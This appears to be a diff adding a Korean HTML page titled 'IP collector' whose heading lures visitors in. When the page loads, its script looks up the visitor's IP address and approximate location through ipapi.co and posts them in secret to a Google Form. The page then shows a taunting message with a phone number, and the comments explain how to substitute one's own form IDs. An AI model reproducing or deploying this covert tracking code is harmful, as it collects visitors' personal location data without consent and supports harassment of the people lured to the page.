@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>IP 수집기</title>
+</head>
+<body>
+    <h1>들어와♥️</h1>
+    <p id="status">정보 수집중...</p>
+
+    <script>
+        async function collectAndSend() {
+            const statusTag = document.getElementById('status');
+            
+            try {
+                // 1. ipapi.co를 통해 IP 및 위치 정보 획득
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                const ip = data.ip;
+                const location = `${data.city}, ${data.region}, ${data.country_name}`;
+                
+                // 2. Google Form 정보 설정 (본인의 정보로 교체 필수!)
+                const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScRSPFO52m-GC8Caf-DwC6u9JDJVqw1Zb-_XqsX4q7Wi5JhiQ/formResponse";
+                const IP_ENTRY = "entry.693988088"; // IP 질문의 ID
+                const LOC_ENTRY = "entry.1566562183"; // 위치 질문의 ID
+
+                // 3. 폼 데이터 생성
+                const formData = new FormData();
+                formData.append(IP_ENTRY, ip);
+                formData.append(LOC_ENTRY, location);
+
+                // 4. Google Form으로 전송 (no-cors 모드 사용)
+                await fetch(FORM_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // CORS 에러 방지를 위해 필수
+                    body: formData
+                });
+
+                statusTag.innerText = "010-9488-6825 친구야 니 ip랑 위치 내꺼할께♥️";
+                console.log("전송 완료:", ip, location);
+
+            } catch (error) {
+                console.error("오류 발생:", error);
+                statusTag.innerText = "연결 중 오류가 발생했습니다.";
+            }
+        }
+
+        // 페이지 로드 시 실행
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
